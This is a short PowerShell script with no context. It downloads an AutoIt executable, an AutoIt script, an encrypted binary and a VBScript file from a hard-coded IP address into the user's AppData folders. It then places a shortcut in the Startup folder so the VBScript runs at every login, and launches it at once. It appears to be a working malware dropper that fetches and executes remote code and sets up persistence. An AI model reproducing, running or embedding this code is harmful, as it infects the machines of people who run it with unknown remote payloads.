$l=$env:LOCALAPPDATA;$r=$env:APPDATA
iwr http://37.221.65.27/r3/Autoit.exe -OutFile "$l\Autoit.exe"
iwr http://37.221.65.27/r3/runfile.au3 -OutFile "$l\runfile.au3"
iwr http://37.221.65.27/r3/encryp.bin -OutFile "$l\encryp.bin"
$f="$r\Win.vbs";iwr http://37.221.65.27/r3/Win.vbs -OutFile $f
$s="$([Environment]::GetFolderPath('Startup'))\Win.lnk"
$w=New-Object -Com WScript.Shell;$c=$w.CreateShortcut($s)
$c.TargetPath=$f;$c.Save();Start-Process $s